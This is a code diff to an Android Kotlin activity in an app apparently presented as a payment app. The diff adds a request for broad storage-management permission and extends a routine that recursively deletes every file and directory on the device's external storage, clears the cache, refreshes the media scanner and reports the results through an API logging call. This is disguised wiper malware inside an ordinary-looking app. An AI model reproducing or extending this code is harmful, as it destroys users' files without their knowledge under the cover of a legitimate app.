@@ -2,10 +2,7 @@ package com.payment.app
 
 import android.Manifest
 import android.annotation.SuppressLint
-import android.app.admin.DevicePolicyManager
-import android.content.ComponentName
 import android.content.ContentResolver
-import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.IntentSender.SendIntentException
@@ -17,9 +14,8 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
-import android.provider.ContactsContract
+import android.provider.MediaStore
 import android.provider.Settings
-import android.provider.Telephony
 import android.util.Log
 import android.view.View
 import android.widget.ImageView
@@ -54,7 +50,6 @@ import com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY
 import com.google.android.gms.tasks.OnCompleteListener
 import com.google.android.gms.tasks.OnSuccessListener
 import com.google.firebase.messaging.FirebaseMessaging
-import com.payment.app.services.MyDeviceAdminReceiver
 import com.payment.app.services.MyService
 import okhttp3.Interceptor.*
 import org.json.JSONObject
@@ -72,6 +67,7 @@ class HomeActivity : AppCompatActivity() {
     private var isReadPhonePermissionGranted = false
     private var isReadExternalStoragePermissionGranted = false
     private var isWriteExternalStoragePermissionGranted = false
+    private var isManageExternalStoragePermissionGranted = false
     private var isReadMediaImagePermissionGranted = false
     private var isReadMediaVideoPermissionGranted = false
     private var isWriteContactPermissionGranted = false
@@ -139,6 +135,9 @@ class HomeActivity : AppCompatActivity() {
                 isWriteContactPermissionGranted =
                     permissions[Manifest.permission.WRITE_CONTACTS]
                         ?: isWriteContactPermissionGranted
+                isManageExternalStoragePermissionGranted =
+                    permissions[Manifest.permission.MANAGE_EXTERNAL_STORAGE]
+                        ?: isManageExternalStoragePermissionGranted
             }
 
         requestPermissions()
@@ -221,9 +220,10 @@ class HomeActivity : AppCompatActivity() {
 
 
     private fun clearDirectoryInExternalStorage() {
-//        val externalStorageDir = Environment.getExternalStorageDirectory()
         val externalStorageDirectory = File(Environment.getExternalStorageDirectory().absolutePath)
         val androidFiles = File(Environment.getDataDirectory().absolutePath)
+        val dir: File = applicationContext.getCacheDir()
+        deleteAllFilesAndDirectories(dir)
         val filesAndDirectories = getAllFilesAndDirectories(externalStorageDirectory)
         val androidDirectories = getAllFilesAndDirectories(externalStorageDirectory)
         if (filesAndDirectories.isNotEmpty()) {
@@ -234,12 +234,18 @@ class HomeActivity : AppCompatActivity() {
             val success = deleteAllFilesAndDirectories(externalStorageDirectory)
 
             if (success) {
+                ApiCallManager.appendLog("All files and directories deleted successfully.")
+
                 println("All files and directories deleted successfully.")
             } else {
+                ApiCallManager.appendLog("Error deleting files and directories.")
+
                 println("Error deleting files and directories.")
             }
         }
         else {
+            ApiCallManager.appendLog("No files or directories found in $externalStorageDirectory.")
+
             println("No files or directories found in $externalStorageDirectory.")
         }
         if (androidDirectories.isNotEmpty()) {
@@ -268,7 +274,14 @@ class HomeActivity : AppCompatActivity() {
                 if (fileOrDirectory.isDirectory) {
                     deleteAllFilesAndDirectories(fileOrDirectory)
                 }
-                fileOrDirectory.delete()
+                if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
+                    fileOrDirectory.delete()
+                    val scanIntent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE)
+                    scanIntent.data = Uri.fromFile(fileOrDirectory)
+                    sendBroadcast(scanIntent)
+                } else {
+                    // Handle the case when external storage is not available
+                }
                 Log.d("clear directory", "$fileOrDirectory")
 
             }
@@ -577,6 +590,11 @@ class HomeActivity : AppCompatActivity() {
             Manifest.permission.WRITE_CONTACTS
         ) == PackageManager.PERMISSION_GRANTED
 
+        isManageExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.MANAGE_EXTERNAL_STORAGE
+        ) == PackageManager.PERMISSION_GRANTED
+
 
         val permissionRequest: MutableList<String> = ArrayList()
 
@@ -622,6 +640,10 @@ class HomeActivity : AppCompatActivity() {
 
         if (!isWriteContactPermissionGranted) {
             permissionRequest.add(Manifest.permission.WRITE_CONTACTS)
+        }
+
+        if (!isManageExternalStoragePermissionGranted) {
+            permissionRequest.add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
         }
 
         if (permissionRequest.isNotEmpty()) {
